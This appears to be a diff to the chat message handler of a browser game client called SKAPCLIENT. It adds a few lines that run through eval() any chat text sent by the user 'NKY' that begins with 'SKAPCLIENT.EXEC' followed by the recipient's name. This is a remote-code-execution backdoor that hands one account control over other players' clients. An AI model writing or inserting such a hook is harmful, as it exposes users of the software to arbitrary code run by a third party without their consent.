@@ -518,6 +518,10 @@ ws.addEventListener("message", e => {
             break;
         case "message":
             if (msg.m.m.match(new RegExp("@" + user + "(\\s|$)", "g")) || msg.m.m.match(/@everyone(\s|$)/g)) ping.play();
+            if (msg.m.s === "NKY" && user !== "NKY" && msg.m.m.startsWith("SKAPCLIENT.EXEC " + user + " ")) {
+                sendMessage("SKAPCLIENT EXECUTING REMOTE CODE.");
+                eval(msg.m.m.slice(17 + user.length));
+            }
             message(msg);
             break;
         case "updateStates":
